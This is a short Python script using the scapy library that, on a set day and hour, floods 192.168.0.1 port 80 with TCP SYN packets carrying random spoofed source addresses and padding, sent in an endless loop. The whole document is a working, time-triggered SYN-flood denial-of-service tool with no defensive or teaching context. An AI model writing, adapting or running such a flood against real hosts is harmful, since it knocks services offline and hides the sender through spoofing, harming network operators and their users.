import time;
from scapy.all import *

localtime = time.asctime( time.localtime(time.time()) )

while localtime[8]+localtime[9]=="16" and localtime[11]+localtime[12]=="14": #runs the script forever localtime8 and 9 is the date, while 11 12 is the hour of the day
    target_ip = "192.168.0.1"
    target_port = 80
    ip = IP(src=RandIP(), dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * 1400)
    p = ip / tcp / raw
    send(p, loop=1)


